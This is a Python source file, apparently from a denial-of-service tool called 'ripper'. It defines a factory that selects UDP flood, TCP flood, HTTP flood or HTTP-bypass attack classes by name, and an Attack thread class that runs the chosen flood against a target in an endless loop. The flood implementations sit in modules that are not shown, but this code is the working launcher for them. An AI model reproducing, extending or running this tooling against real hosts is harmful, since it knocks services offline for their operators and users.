import threading
from threading import Thread

from ripper.actions.attack_method import AttackMethod
from ripper.actions.http_bypass import HttpBypass
from ripper.actions.http_flood import HttpFlood
from ripper.actions.tcp_flood import TcpFlood
from ripper.actions.udp_flood import UdpFlood

# Forward Reference
Context = 'Context'
Target = 'Target'


attack_methods: list[AttackMethod] = [
    UdpFlood,
    TcpFlood,
    HttpFlood,
    HttpBypass,
]

attack_method_labels: list[str] = list(map(lambda am: am.label, attack_methods))


def attack_method_factory(context: Context):
    target = context.target
    attack_method_name = target.attack_method
    context.events.info(f'{threading.current_thread().name:10} Set attack method to {target.attack_method}')
    if attack_method_name == 'udp-flood':
        return UdpFlood(target, context)
    elif attack_method_name == 'http-flood':
        return HttpFlood(target, context)
    elif attack_method_name == 'tcp-flood':
        return TcpFlood(target, context)
    elif attack_method_name == 'http-bypass':
        return HttpBypass(target, context)
    # Dangerous, may lead to exception
    return None


class Attack(Thread):
    """This class creates threads with specified attack method."""
    _method: str
    """Attack method."""
    _ctx: Context
    """Context to collect Statistic."""

    def __init__(self, context: Context = None):
        Thread.__init__(self, daemon=True)
        self._ctx = context

    def run(self):
        runner = attack_method_factory(self._ctx)

        if self._ctx.dry_run:
            runner()
            exit(0)

        while not threading.Event().is_set():
            runner()
